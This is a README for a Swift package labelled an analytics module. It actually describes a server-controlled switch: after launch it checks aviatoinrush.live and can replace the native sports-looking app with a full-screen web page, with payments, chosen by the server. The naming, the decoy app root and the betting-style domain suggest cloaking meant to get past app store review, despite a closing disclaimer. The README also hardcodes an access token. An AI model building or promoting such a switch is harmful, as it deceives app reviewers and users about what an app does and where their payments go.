# AnalyticsKit

Reusable SwiftUI analytics launch module for iPhone apps.

## What Is Included

- Launch analytics request on demand or at app root.
- Root entry flow can open the native app immediately, then run the server check after a short configurable delay.
- Server response support for raw `true` / `false`, `enabled/url`, and `result/postback_url` responses.
- Full-screen destination renderer with loading, reload and back controls.
- Destination prewarming for faster first load.
- Optional root entry flow: loading screen, launch check, then local app or server-provided destination.
- Apple Pay compatible `WKWebView` setup, assuming the loaded website is configured for Apple Pay on the web.
- On-demand file upload support in `WKWebView` when the loaded page opens a file picker.

## Add To An App

Add this folder as a local Swift Package in Xcode:

```swift
dependencies: [
    .package(path: "../analytics-kit")
]
```

Then import it where needed:

```swift
import AnalyticsKit
```

## Configure

```swift
let analyticsConfig = AnalyticsLaunchConfig(
    serverDomain: "aviatoinrush.live",
    analyticsToken: "8504abe7349f9a2423193188abc6047814617a5c07b847df1671c74a913e97cc",
    bundleID: Bundle.main.bundleIdentifier ?? "com.sports.ulama.nacional"
)
```

For this project the ready-made config is also available:

```swift
AnalyticsLaunchConfig.ulamaNacional
```

## Use The Launcher

```swift
AnalyticsStart(
    config: .ulamaNacional,
    languageCode: "en"
)
```

The launcher sends a request, waits for the backend response, and continues with the returned URL only when the response is enabled.

## Use As App Root

```swift
@main
struct ExampleApp: App {
    var body: some Scene {
        WindowGroup {
AnalyticsEntry(
    config: .ulamaNacional,
    requestReviewBeforeCheck: false
) {
                RootTabView()
            }
        }
    }
}
```

Default root flow:

```text
native app -> short delay -> POST /api/v1/check -> keep native app or open returned destination
```

The delay is configured through `initialCheckDelay` in `AnalyticsLaunchConfig` and defaults to `0.45` seconds.

## Analytics Request

The module sends a `POST` request to:

```text
https://aviatoinrush.live/api/v1/check
```

Headers:

```text
Content-Type: application/json
Accept: application/json
Authorization: Bearer <analyticsToken>
X-Analytics-Token: <analyticsToken>
X-Bundle-ID: <bundleID>
X-Server-Domain: <serverDomain>
```

Body example:

```json
{
  "app_id": "com.sports.ulama.nacional",
  "bundle_id": "com.sports.ulama.nacional",
  "domain": "aviatoinrush.live",
  "key": "analytics-token"
}
```

## Backend Response

Supported disabled response:

```json
false
```

Supported enabled response with destination URL:

```json
{
  "result": true,
  "postback_url": "https://example.com/start"
}
```

The module appends:

```text
platform=ios
language=<languageCode>
```

The response can also use `enabled` with `url`, `openURL`, `targetURL`, or supported legacy URL keys.

## Firebase

Firebase is not included. The module does not import `FirebaseCore`, does not import `FirebaseAnalytics`, and does not send `app_instance_id`.

## Apple Pay Notes

The destination renderer can display Apple Pay flows when the website itself supports Apple Pay on the web. The web domain must use HTTPS, have a valid Apple Pay merchant setup, host the required merchant association file, and run the Apple Pay JavaScript flow correctly.

## File Upload Notes

File upload handling is on-demand. The package does not request file access up front. The system picker is presented only when the loaded web page opens a file upload control such as `input[type=file]`.

## Store Review Note

Use this module transparently. Do not use remote responses to hide, swap, or review-gate unrelated app functionality.
